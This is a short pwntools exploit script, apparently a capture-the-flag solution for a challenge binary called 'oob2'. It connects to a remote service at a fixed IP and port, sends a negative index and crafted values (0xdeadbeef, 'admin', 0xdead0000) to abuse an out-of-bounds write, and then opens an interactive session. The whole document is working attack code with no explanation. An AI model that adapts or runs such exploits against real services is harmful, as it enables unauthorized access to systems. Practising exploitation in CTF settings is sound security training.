from pwn import *

ip = "140.110.112.77"
port = 3112

context.arch = "amd64"

r = remote(ip, port)
# r = process("./oob2")

r.sendlineafter(":", "-4")
r.sendlineafter(":", p64(0xdeadbeef))
r.sendlineafter(":", "1234")

r.sendlineafter(":", "0")
r.sendlineafter(":", "admin")
r.sendlineafter(":", str(0xdead0000))

r.interactive()
